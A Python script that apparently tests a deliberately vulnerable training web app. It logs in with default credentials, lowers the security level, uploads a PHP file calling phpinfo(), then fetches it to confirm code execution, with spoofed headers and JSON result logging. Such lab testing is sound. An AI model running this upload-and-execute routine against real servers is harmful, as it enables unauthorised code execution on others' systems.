import requests
from bs4 import BeautifulSoup
from datetime import datetime
from pathlib import Path
import os
import sys
import json
import time

# Setup directories and session
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL and/or request rate were not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 10, 'medium': 5, 'high': 3}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

upload_url = f"{base_url}/vulnerabilities/upload/"

# Headers to spoof User-Agent and IP address
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'X-Forwarded-For': '192.168.1.1'
}

# Construct the target URL for brute force attacks
target_url = f"{base_url}/vulnerabilities/brute/"
login_url = f"{base_url}/login.php"
security_url = f"{base_url}/security.php"

def login_and_setup_security():
    #response = session.get(login_url)
    data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
    }
    response = session.post(login_url, data=data, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
    time.sleep(delay) 
    
    #response = session.get(security_url)
    data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': user_token
    }
    session.post(security_url, data=data, headers=headers)
    time.sleep(delay) 

def create_malicious_file():
    # This function creates a simple PHP file that executes phpinfo()
    malicious_code = '<?php phpinfo(); ?>'
    with open("malicious.php", "w") as file:
        file.write(malicious_code)
    return "malicious.php"

def upload_file_attack():
    file_path = create_malicious_file()
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []

    with open(file_path, 'rb') as file:
        files = {'uploaded': (file_path, file, 'application/x-php')}
        response = session.post(upload_url, files=files, headers=headers)
        total_tests += 1

        if response.status_code == 200:
            tests_passed += 1
            result_status = "PASSED - File upload Successful"
        else:
            tests_failed += 1
            result_status = "FAILED - File upload Unsuccessful"
        
        details.append({
            "test_type": "File Upload",
            "file_path": file_path,
            "response_code": response.status_code,
            "status": result_status
        })
        print(f"Tested:'File Upload' with path '{file_path}'\nResult Status: {result_status}\nResponse Code: {response.status_code}\n")
        time.sleep(delay)
        
        # Attempt to execute the uploaded file
        verify_url = f"{base_url}/hackable/uploads/{file_path}"
        exec_response = session.get(verify_url)
        total_tests += 1
        if "phpinfo" in exec_response.text:
            tests_passed += 1
            exec_status = "PASSED - File execution Successful"
        else:
            tests_failed += 1
            exec_status = "FAILED - File execution Unsuccessful"

        details.append({
            "test_type": "File Execution",
            "file_path": file_path,
            "response_code": exec_response.status_code,
            "status": exec_status,
            "response_content": exec_response.text[:200]  # Include a snippet of the response for review
        })
        print(f"Tested:'File Execution' with path '{file_path}'\nResult Status: {exec_status}\nResponse Code: {response.status_code}\n")
        time.sleep(delay)
    
    # Log the results
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': upload_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    upload_file_attack()